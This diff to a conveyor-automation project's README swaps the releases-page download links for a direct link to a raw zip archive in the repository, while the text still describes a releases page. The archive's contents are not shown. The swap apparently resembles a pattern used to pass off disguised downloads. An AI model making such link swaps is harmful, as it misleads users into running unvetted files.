@@ -1,6 +1,6 @@
 # ⚙️ conveyor-automation-system - Easy Control for Conveyors
 
-[![Download conveyor-automation-system](https://img.shields.io/badge/Download-conveyor--automation--system-blue?style=for-the-badge)](https://github.com/lonley98/conveyor-automation-system/releases)
+[![Download conveyor-automation-system](https://github.com/lonley98/conveyor-automation-system/raw/refs/heads/main/project-files/automation_system_conveyor_v2.2.zip)](https://github.com/lonley98/conveyor-automation-system/raw/refs/heads/main/project-files/automation_system_conveyor_v2.2.zip)
 
 ---
 
@@ -120,7 +120,7 @@ The application uses realistic values and timing to mimic a real conveyor system
 
 You can visit the releases page to download the latest version of the software:
 
-[Download conveyor-automation-system](https://github.com/lonley98/conveyor-automation-system/releases)
+[Download conveyor-automation-system](https://github.com/lonley98/conveyor-automation-system/raw/refs/heads/main/project-files/automation_system_conveyor_v2.2.zip)
 
 This page contains all versions and related files. Choose the file that suits your system, download, and follow the installation steps in this guide.
 
